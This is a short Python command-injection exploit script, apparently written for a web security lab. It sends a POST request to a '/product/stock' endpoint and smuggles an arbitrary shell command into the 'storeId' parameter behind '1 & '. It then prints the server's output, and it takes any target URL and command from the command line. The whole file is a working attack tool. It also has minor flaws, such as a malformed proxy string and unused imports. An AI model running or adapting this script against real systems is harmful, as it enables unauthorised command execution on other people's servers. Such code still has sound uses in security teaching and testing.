import sys
import requests
import urllib3

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http:127.0.0.1:8080'}


def run_command(url, command):
    stock_path = '/product/stock'
    comand_injection = '1 & ' + command
    params = {'productId': 2, 'storeId': comand_injection}
    r = requests.post(url + stock_path, data=params)
    if (len(r.text) > 3):
        print("[+] Command injection successful!")
        print("[+] Output of Command: " + r.text)
    else:
        print("[+] Command injection failed")


def main():
    if len(sys.argv) != 3:
        print("[+] Usage: %s <url> <command>" % sys.argv[0])
        print("[+] Example: %s www.example.com whoami" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    command = sys.argv[2]
    print("exploiting command injection ...")
    run_command(url, command)


if __name__ == "__main__":
    main()
